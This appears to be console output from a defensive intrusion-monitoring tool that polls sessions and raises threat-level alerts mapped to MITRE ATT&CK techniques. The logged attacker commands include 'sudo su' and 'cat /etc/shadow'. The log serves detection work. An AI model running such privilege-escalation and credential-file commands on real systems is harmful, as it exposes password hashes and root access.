+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 9
+[DEBUG] New events detected for session be4c65b86df8. Processing...
+[*] Logged MALICIOUS event for session be4c65b86df8 to malicious_alerts.log
+
+==================================================
+ADAPTIVE INTELLIGENCE FOR SESSION: be4c65b86df8
+Detected Level : 3 (MALICIOUS)
+Intent         : Privilege Escalation
+Skill Level    : Advanced
+Attack Stage   : Privilege Escalation
+RAG Mapping    : Sudo and Sudo Caching (T1548.003)
+Summary        : The user executed a command sequence ('ls; sudo su; cat /etc/shadow; sleep 5; ls; uname -r') that matches Sudo and Sudo Caching (T1548.003) behavior, triggering detections: Privilege Escalation Attempt.
+Status         : Policy Updated for Live Session
+==================================================
+
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 3, Previous: 0
+[DEBUG] New events detected for session 16c2f697f636. Processing...
+[*] Logged NORMAL event for session 16c2f697f636 to normal_activity.log
+
+==================================================
+ADAPTIVE INTELLIGENCE FOR SESSION: 16c2f697f636
+Detected Level : 0 (NORMAL)
+Intent         : Unknown
+Skill Level    : Beginner
+Attack Stage   : Unknown
+RAG Mapping    : N/A
+Summary        : The user executed a command sequence () that indicates suspicious activity, triggering detections: .
+Status         : Policy Updated for Live Session
+==================================================
+
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 10, Previous: 3
+[DEBUG] New events detected for session 16c2f697f636. Processing...
+[*] Logged SUSPICIOUS event for session 16c2f697f636 to suspicious_activity.log
+
+==================================================
+ADAPTIVE INTELLIGENCE FOR SESSION: 16c2f697f636
+Detected Level : 2 (SUSPICIOUS)
+Intent         : Privilege Escalation
+Skill Level    : Intermediate
+Attack Stage   : Privilege Escalation
+RAG Mapping    : Sudo and Sudo Caching (T1548.003)
+Summary        : The user executed a command sequence ('ls', 'sudo su') that matches Sudo and Sudo Caching (T1548.003) behavior, triggering detections: Privilege Escalation Attempt, System Discovery (Reconnaissance).
+Status         : Policy Updated for Live Session
+==================================================
+
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 12, Previous: 10
+[DEBUG] New events detected for session 16c2f697f636. Processing...
+[*] Logged SUSPICIOUS event for session 16c2f697f636 to suspicious_activity.log
+
+==================================================
+ADAPTIVE INTELLIGENCE FOR SESSION: 16c2f697f636
+Detected Level : 2 (SUSPICIOUS)
+Intent         : System Discovery
+Skill Level    : Intermediate
+Attack Stage   : Reconnaissance
+RAG Mapping    : File and Directory Discovery (T1083)
+Summary        : The user executed a command sequence ('ls', 'sudo su', 'whoami', 'pwd') that matches File and Directory Discovery (T1083) behavior, triggering detections: Privilege Escalation Attempt, System Discovery (Reconnaissance).
+Status         : Policy Updated for Live Session
+==================================================
+
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 13, Previous: 12
+[DEBUG] New events detected for session 16c2f697f636. Processing...
+[*] Logged SUSPICIOUS event for session 16c2f697f636 to suspicious_activity.log
+
+==================================================
+ADAPTIVE INTELLIGENCE FOR SESSION: 16c2f697f636
+Detected Level : 2 (SUSPICIOUS)
+Intent         : System Discovery
+Skill Level    : Intermediate
+Attack Stage   : Reconnaissance
+RAG Mapping    : Unsecured Credentials (T1552)
+Summary        : The user executed a command sequence ('ls', 'sudo su', 'whoami', 'pwd', 'cat etc/shadow') that matches Unsecured Credentials (T1552) behavior, triggering detections: Privilege Escalation Attempt, System Discovery (Reconnaissance).
+Status         : Policy Updated for Live Session
+==================================================
+
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 13, Previous: 13
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 13, Previous: 13
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 13, Previous: 13
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 14, Previous: 13
+[DEBUG] New events detected for session 16c2f697f636. Processing...
+[*] Logged SUSPICIOUS event for session 16c2f697f636 to suspicious_activity.log
+
+==================================================
+ADAPTIVE INTELLIGENCE FOR SESSION: 16c2f697f636
+Detected Level : 2 (SUSPICIOUS)
+Intent         : System Discovery
+Skill Level    : Intermediate
+Attack Stage   : Reconnaissance
+RAG Mapping    : Unsecured Credentials (T1552)
+Summary        : The user executed a command sequence ('ls', 'sudo su', 'whoami', 'pwd', 'cat etc/shadow', 'cat /etc/shadow') that matches Unsecured Credentials (T1552) behavior, triggering detections: Privilege Escalation Attempt, System Discovery (Reconnaissance).
+Status         : Policy Updated for Live Session
+==================================================
+
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 15, Previous: 14
+[DEBUG] New events detected for session 16c2f697f636. Processing...
+[*] Logged SUSPICIOUS event for session 16c2f697f636 to suspicious_activity.log
+
+==================================================
+ADAPTIVE INTELLIGENCE FOR SESSION: 16c2f697f636
+Detected Level : 2 (SUSPICIOUS)
+Intent         : System Discovery
+Skill Level    : Intermediate
+Attack Stage   : Reconnaissance
+RAG Mapping    : File and Directory Discovery (T1083)
+Summary        : The user executed a command sequence ('ls', 'sudo su', 'whoami', 'pwd', 'cat etc/shadow', 'cat /etc/shadow', 'ls') that matches File and Directory Discovery (T1083) behavior, triggering detections: Privilege Escalation Attempt, System Discovery (Reconnaissance).
+Status         : Policy Updated for Live Session
+==================================================
+
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 15, Previous: 15
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 15, Previous: 15
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 15, Previous: 15
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 15, Previous: 15
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 15, Previous: 15
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 15, Previous: 15
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 15, Previous: 15
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 15, Previous: 15
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
